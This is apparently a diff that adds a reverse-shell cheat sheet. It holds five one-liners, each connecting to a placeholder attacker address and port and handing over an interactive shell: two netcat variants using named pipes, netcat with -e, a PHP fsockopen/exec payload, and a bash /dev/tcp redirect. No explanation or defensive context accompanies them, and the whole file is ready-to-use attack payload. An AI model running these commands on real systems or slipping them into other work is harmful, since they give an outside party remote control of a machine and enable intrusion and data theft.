@@ -1,0 +1,14 @@
+#Netcat without e v.1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IPAdress PortNumber >/tmp/f
+
+#Netcat without e v.2
+mknod /tmp/backpipe p;/bin/sh 0</tmp/backpipe | nc IPAdress PortNumber 1>/tmp/backpipe
+
+#Netcat
+nc IPAdress Port -e /bin/sh 
+
+#Php
+$sock=fsockopen("IPAdress",PortNumber); exec("/bin/sh -i <&3 >&3 2>&3");
+
+#Bash
+bash -i >& /dev/tcp/IPAdress/PortNumber 0>&1
